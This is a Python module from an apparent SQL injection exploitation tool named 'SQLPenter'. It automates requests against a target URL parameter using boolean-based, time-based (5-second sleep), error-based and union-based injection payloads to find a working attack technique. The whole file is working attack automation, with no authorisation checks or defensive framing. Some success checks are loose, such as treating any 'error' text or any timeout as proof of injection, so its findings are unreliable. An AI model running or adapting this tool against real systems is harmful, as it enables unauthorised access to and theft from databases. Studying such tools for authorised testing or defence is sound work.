#!/usr/bin/env python3
"""
SQL Injection exploitation module for SQLPenter.
Determines the best method for exploiting SQL injection vulnerabilities.
"""

import asyncio
from typing import Dict, Any, Optional, List
import aiohttp
from loguru import logger

from core.utils import create_payload, load_payloads


class SQLiInjector:
    """
    Finds and exploits SQL injection vulnerabilities through different techniques.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize the SQL injection injector.
        
        Args:
            config: Dictionary containing configuration parameters
        """
        self.timeout = config.get("timeout", 5)
        self.proxy = config.get("proxy")
        self.delay = config.get("delay", 0)
        
        # Load exploitation payloads
        self.payloads = load_payloads("payloads/sqli_payloads.json")
        
        # Different injection techniques to try
        self.injection_techniques = [
            "boolean_based",
            "time_based",
            "error_based",
            "union_based"
        ]
    
    async def find_injection_method(
        self, target_url: str, param_info: Dict[str, Any], db_type: str
    ) -> Optional[str]:
        """
        Find the most effective injection method for the target.
        
        Args:
            target_url: The target URL
            param_info: Dictionary containing parameter information
            db_type: Database type identified by fingerprinter
            
        Returns:
            The most effective injection method or None if none work
        """
        logger.info(f"Finding injection method for {target_url}, param: {param_info['param']}")
        
        # Set up HTTP session with proxy if needed
        session_kwargs = {
            "timeout": aiohttp.ClientTimeout(total=self.timeout)
        }
        if self.proxy:
            session_kwargs["proxy"] = self.proxy
        
        # Try each injection technique
        async with aiohttp.ClientSession(**session_kwargs) as session:
            for technique in self.injection_techniques:
                if await self._test_technique(session, target_url, param_info, db_type, technique):
                    logger.success(f"Found working injection technique: {technique}")
                    return technique
        
        logger.warning(f"No working injection technique found for {target_url}")
        return None
    
    async def _test_technique(
        self,
        session: aiohttp.ClientSession,
        target_url: str,
        param_info: Dict[str, Any],
        db_type: str,
        technique: str
    ) -> bool:
        """
        Test a specific injection technique.
        
        Args:
            session: aiohttp client session
            target_url: The target URL
            param_info: Dictionary containing parameter information
            db_type: Database type
            technique: Injection technique to test
            
        Returns:
            True if technique works, False otherwise
        """
        # Get the appropriate payloads for the technique and database
        technique_payloads = self.payloads.get(technique, {}).get(db_type, [])
        if not technique_payloads:
            # Fall back to generic payloads if no db-specific ones are available
            technique_payloads = self.payloads.get(technique, {}).get("generic", [])
            
        if not technique_payloads:
            logger.debug(f"No {technique} payloads available for {db_type}")
            return False
        
        # Test each payload
        for payload in technique_payloads:
            try:
                # Create injection payload based on parameter information
                injection_payload = create_payload(
                    param_info["param"], 
                    payload, 
                    param_info["injection_point"]
                )
                
                # Add delay if configured
                if self.delay > 0:
                    await asyncio.sleep(self.delay)
                
                # Create request parameters based on method
                request_params = {}
                if param_info["method"].upper() == "GET":
                    request_params["params"] = injection_payload
                else:
                    request_params["data"] = injection_payload
                
                # Send the request
                async with session.request(
                    param_info["method"],
                    target_url,
                    **request_params
                ) as response:
                    content = await response.text()
                    
                    # Different verification methods based on technique
                    if technique == "boolean_based":
                        # For boolean-based, check if true condition returns different response than false
                        true_pattern = "1=1"
                        false_pattern = "1=2"
                        
                        # Create payloads for true and false conditions
                        true_payload = create_payload(
                            param_info["param"],
                            payload.replace("CONDITION", true_pattern),
                            param_info["injection_point"]
                        )
                        
                        false_payload = create_payload(
                            param_info["param"],
                            payload.replace("CONDITION", false_pattern),
                            param_info["injection_point"]
                        )
                        
                        # Send true condition request
                        true_request_params = {}
                        if param_info["method"].upper() == "GET":
                            true_request_params["params"] = true_payload
                        else:
                            true_request_params["data"] = true_payload
                            
                        await asyncio.sleep(self.delay)
                        async with session.request(
                            param_info["method"],
                            target_url,
                            **true_request_params
                        ) as true_response:
                            true_content = await true_response.text()
                            
                        # Send false condition request
                        false_request_params = {}
                        if param_info["method"].upper() == "GET":
                            false_request_params["params"] = false_payload
                        else:
                            false_request_params["data"] = false_payload
                            
                        await asyncio.sleep(self.delay)
                        async with session.request(
                            param_info["method"],
                            target_url,
                            **false_request_params
                        ) as false_response:
                            false_content = await false_response.text()
                            
                        # Check if responses differ
                        if true_content != false_content:
                            return True
                        
                    elif technique == "time_based":
                        # For time-based, check if the response takes longer with sleep command
                        start_time = asyncio.get_event_loop().time()
                        sleep_payload = create_payload(
                            param_info["param"],
                            payload.replace("SLEEP_TIME", "5"),  # 5 second sleep
                            param_info["injection_point"]
                        )
                        
                        sleep_request_params = {}
                        if param_info["method"].upper() == "GET":
                            sleep_request_params["params"] = sleep_payload
                        else:
                            sleep_request_params["data"] = sleep_payload
                            
                        # Use higher timeout for time-based tests
                        time_session_kwargs = {
                            "timeout": aiohttp.ClientTimeout(total=self.timeout + 10)
                        }
                        if self.proxy:
                            time_session_kwargs["proxy"] = self.proxy
                            
                        async with aiohttp.ClientSession(**time_session_kwargs) as time_session:
                            await asyncio.sleep(self.delay)
                            async with time_session.request(
                                param_info["method"],
                                target_url,
                                **sleep_request_params
                            ) as sleep_response:
                                # Just read the response to complete the request
                                await sleep_response.text()
                                
                        elapsed = asyncio.get_event_loop().time() - start_time
                        
                        # If elapsed time is close to the sleep time, it worked
                        if elapsed >= 4.5:  # Allow for some network delay variation
                            return True
                    
                    elif technique == "error_based":
                        # For error-based, check if error message contains extractable data
                        if "SQL syntax" in content or "error" in content.lower():
                            return True
                    
                    elif technique == "union_based":
                        # For union-based, check if we can extract version or other data
                        version_strings = [
                            "MySQL", "PostgreSQL", "Microsoft SQL Server", 
                            "Oracle", "SQLite", "MariaDB", "version"
                        ]
                        
                        if any(version in content for version in version_strings):
                            return True
            
            except asyncio.TimeoutError:
                if technique == "time_based":
                    # For time-based, timeout is a good sign
                    return True
                logger.debug(f"Timeout during {technique} injection test")
            
            except Exception as e:
                logger.debug(f"Error during {technique} injection test: {e}")
                continue
        
        return False